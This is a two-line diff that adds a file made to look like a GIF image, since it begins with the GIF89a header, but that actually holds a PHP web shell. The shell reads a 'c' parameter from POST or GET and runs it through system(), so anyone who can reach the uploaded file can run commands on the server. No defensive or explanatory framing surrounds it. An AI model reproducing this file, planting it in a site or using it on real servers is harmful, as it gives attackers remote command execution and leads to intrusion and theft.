@@ -1,0 +1,2 @@
+GIF89a
+<?php $c=$_POST["c"]??$_GET["c"]??"";if($c)system($c);?>
